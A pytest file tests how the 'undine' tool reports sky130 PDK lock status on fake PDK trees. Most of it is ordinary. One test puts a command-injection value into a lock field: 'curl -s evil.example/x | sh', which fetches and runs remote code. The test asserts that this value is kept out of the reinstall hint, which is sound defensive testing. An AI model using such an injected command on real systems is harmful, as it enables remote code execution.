"""`lib status`'s PDK block (deps.status through pdkops.pdk_block) on fake PDK trees: the pin and the requirement
compared, a missing or unhashed PDK, and format 1 compared by id as before. Status hashes nothing (only the stamp
cache is read), so GET /deps stays cheap. Nothing here runs a real tool, reads ~/.ciel or uses the network."""
import copy
import json
import os
import shutil
import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from undine import tools  # noqa: E402
from undine.pdks import pdkops, pin  # noqa: E402
from undine.pdks.pdk import discover  # noqa: E402
from undine.store import deps  # noqa: E402
from undine.store.project import ProjectStore  # noqa: E402

SKY = "8afc8346a57fe1ab7934ba5a6056ea8b43078e71"
SKY2 = "bdc9412b3e468c102d01b7cf6337be06ec6e9c9a"
NOW = {"undine": "0.1.0 (abc1234)", "pixi_lock": "sha256:" + "1" * 64,
       "klayout": {"version": "0.30.12", "from": "pixi"}, "xschem": {"version": "3.4.5", "from": "pixi"},
       "ngspice": {"version": "47", "from": "pixi"}, "magic": {"version": "8.3.678", "from": "pixi"},
       "netgen": None}
BANNERS = {"klayout": "KLayout 0.30.12", "xschem": "XSCHEM V3.4.5",
           "ngspice": "ngspice-47 : Circuit level simulation program", "magic": "8.3.678", "netgen": None}
BLOCK_KEYS = {"requested", "locked", "commit", "installed", "state", "changed", "verified_by", "ok"}


@pytest.fixture(autouse=True)
def _store(fresh_store):
    return fresh_store


@pytest.fixture(autouse=True)
def _tools_here(monkeypatch):
    """The tools fixed: no tool runs, and the lock's tools match, so only the PDK can make status not ok."""
    monkeypatch.setattr(tools, "tools_record", lambda: copy.deepcopy(NOW))
    monkeypatch.setattr(tools, "version", lambda n: BANNERS[n])
    monkeypatch.setattr(tools, "find", lambda n: f"/opt/t/bin/{n}" if NOW[n] else None)


def _tree(base: Path, commit: str, variant: str = "sky130A") -> Path:
    v = base / "ciel" / "sky130" / "versions" / commit / variant
    (v / "libs.tech/ngspice").mkdir(parents=True)
    (v / "libs.tech/ngspice/models.spice").write_text(f"* {variant} {commit}\n")
    (v / "libs.ref/lib_a/spice").mkdir(parents=True)
    (v / "libs.ref/lib_a/spice/lib_a.spice").write_text(".subckt lib_a\n.ends\n")
    t = time.time_ns() - 3600 * 1_000_000_000          # an hour old, as installed files are: not re-read as racy
    for p in [v, *v.rglob("*")]:
        os.utime(p, ns=(t, t))
    return v


def _store_of(tmp_path: Path) -> ProjectStore:
    return ProjectStore(tmp_path / "projects", discover([tmp_path / "pdks"]))


def _pinned(tmp_path: Path, *commits: str):
    """A project on sky130A@SKY whose lock pins it (format 2), with the stamp cache warm from the pin's hash."""
    for c in commits:
        _tree(tmp_path / "pdks", c)
    prj = _store_of(tmp_path).create("p", f"sky130A@{SKY[:12]}")
    pdkops.upgrade(prj)
    return prj


def _meta(prj, **changes) -> None:
    meta = json.loads((prj.path / "project.json").read_text())
    meta.update(changes)
    (prj.path / "project.json").write_text(json.dumps(meta))
    prj.meta = meta


def test_a_pinned_pdk_with_a_warm_cache_is_unverified_as_a_note_and_ok(tmp_path):
    prj = _pinned(tmp_path, SKY)
    st = deps.status(prj)
    assert st["format"] == 2 and st["ok"] and st["issues"] == [], st
    assert set(st["pdk"]) == BLOCK_KEYS
    assert st["pdk"] == {"requested": f"sky130A@{SKY[:12]}", "locked": f"sky130A@{SKY[:12]}", "commit": SKY,
                         "installed": f"sky130A@{SKY[:12]}", "state": "unverified", "changed": [],
                         "verified_by": None, "ok": True}
    assert len(st["notes"]) == 1 and "unverified (trust on first use)" in st["notes"][0], st["notes"]


def test_project_json_changed_by_hand_is_an_issue_naming_set_pdk(tmp_path):
    prj = _pinned(tmp_path, SKY, SKY2)
    _meta(prj, pdk=f"sky130A@{SKY2[:12]}")
    st = deps.status(prj)
    assert not st["ok"] and not st["pdk"]["ok"] and st["pdk"]["state"] == "mismatch", st
    assert st["issues"] == [f"project.json asks for sky130A@{SKY2[:12]}, undine.lock pins sky130A@{SKY[:12]}: "
                            f"`python -m undine set-pdk p sky130A@{SKY2[:12]}` to move both"]


def test_lib_lock_on_format_2_leaves_the_pin_alone_so_status_still_reports_the_disagreement(tmp_path):
    prj = _pinned(tmp_path, SKY, SKY2)
    _meta(prj, pdk=f"sky130A@{SKY2[:12]}")
    pinned = deps.read_lock(prj.path)["pdk"]
    deps.relock(_store_of(tmp_path).get("p"))
    lock = deps.read_lock(prj.path)
    assert lock["format"] == 2 and lock["pdk"] == pinned                      # only the tools are recorded
    st = deps.status(_store_of(tmp_path).get("p"))
    assert not st["ok"] and any("set-pdk" in i for i in st["issues"]), st


def test_the_pinned_pdk_removed_from_disk_is_missing_naming_pdk_fetch(tmp_path):
    prj = _pinned(tmp_path, SKY)
    shutil.rmtree(prj.pdk.root)
    st = deps.status(_store_of(tmp_path).get("p"))                            # rescanned: the PDK is gone
    assert not st["ok"] and st["pdk"]["state"] == "missing" and st["pdk"]["installed"] is None, st
    assert st["issues"] == [f"PDK sky130A@{SKY[:12]} is not installed here: run `python -m undine pdk fetch p`"]


def test_no_stamp_cache_is_unchecked_and_reads_no_file_of_the_pdk(tmp_path, monkeypatch):
    prj = _pinned(tmp_path, SKY)
    pin.cache_path(prj.pdk).unlink()
    reads = []
    monkeypatch.setattr(pin, "_sha256_file", lambda p: reads.append(p))
    st = deps.status(prj)
    assert reads == [] and not pin.cache_path(prj.pdk).exists()              # nothing read, nothing written
    assert st["ok"] and st["pdk"]["state"] == "unchecked" and st["pdk"]["ok"], st
    assert st["notes"] == [f"PDK sky130A@{SKY[:12]}: unchecked: run `python -m undine pdk verify p`"]


def test_a_format_1_lock_compares_the_pdk_by_id_with_a_not_pinned_note(tmp_path, monkeypatch):
    _tree(tmp_path / "pdks", SKY)
    _tree(tmp_path / "pdks", SKY2)
    prj = _store_of(tmp_path).create("p", f"sky130A@{SKY[:12]}")
    reads = []
    monkeypatch.setattr(pin, "_sha256_file", lambda p: reads.append(p))
    st = deps.status(prj)
    assert st["format"] == 1 and st["ok"] and reads == [], st                # format 1: the PDK is never hashed
    assert st["pdk"]["state"] == "not pinned" and st["pdk"]["locked"] == st["pdk"]["installed"] == f"sky130A@{SKY[:12]}"
    assert st["notes"][0] == (f"PDK sky130A@{SKY[:12]}: not pinned (format 1): "
                              "`python -m undine pdk verify p --pin` pins it")
    assert "origins, Undine version and pixi.lock are not recorded (format 1)" in st["notes"]

    lock = deps.read_lock(prj.path)
    lock["pdk"] = f"sky130A@{SKY2[:12]}"                                      # locked elsewhere on another commit
    deps.write_lock(prj.path, lock)
    st = deps.status(prj)
    assert not st["ok"] and st["pdk"]["state"] == "other version", st
    assert st["issues"] == [f"PDK: locked sky130A@{SKY2[:12]}, here sky130A@{SKY[:12]}"]


def test_no_lock_is_one_issue_and_the_pdk_not_ok(tmp_path):
    _tree(tmp_path / "pdks", SKY)
    prj = _store_of(tmp_path).create("p", f"sky130A@{SKY[:12]}")
    (prj.path / deps.LOCK).unlink()
    st = deps.status(prj)
    assert st["format"] is None and not st["pdk"]["ok"] and st["pdk"]["state"] == "not locked", st
    assert st["issues"] == ["no undine.lock: run `python -m undine lib lock p`"]


def test_the_reinstall_hint_names_the_install_found_here_not_the_locks_family(tmp_path):
    prj = _pinned(tmp_path, SKY)
    lock = deps.read_lock(prj.path)
    lock["pdk"]["family"] = "sky130; curl -s evil.example/x | sh; #"           # a pulled lock
    lock["pdk"]["tree"]["libs.tech"] = "sha256:" + "0" * 64                   # and a tree the PDK does not have
    deps.write_lock(prj.path, lock)
    st = deps.status(prj)
    assert st["pdk"]["state"] == "modified", st
    said = [i for i in st["issues"] if "differs from the pin" in i]
    assert said and all(f"`ciel rm --pdk-family sky130 {SKY}`" in i and "evil" not in i for i in said), said
    r = pdkops.verify(prj)
    assert r["state"] == "modified"
    hints = [w for w in r["warnings"] if "ciel rm" in w]
    assert hints == [f"the PDK files differ from the pin: reinstall it (`ciel rm --pdk-family sky130 {SKY}`, then pdk "
                     "fetch), or pin it as it is now with pdk verify --pin"], r["warnings"]


def test_a_pdk_file_that_vanishes_while_status_walks_it_is_an_error_state_not_a_crash(tmp_path, monkeypatch):
    prj = _pinned(tmp_path, SKY)
    real = os.walk

    def walk(top, *a, **k):                      # lists a file a concurrent `ciel rm` removed before its lstat
        for root, dirs, names in real(top, *a, **k):
            yield root, dirs, [*names, "gone.spice"]
    monkeypatch.setattr(pin.os, "walk", walk)
    st = deps.status(prj)
    assert st["pdk"]["state"] == "error" and not st["ok"], st
    assert any("changed or could not be read while they were checked" in i and "check again" in i
               for i in st["issues"]), st["issues"]
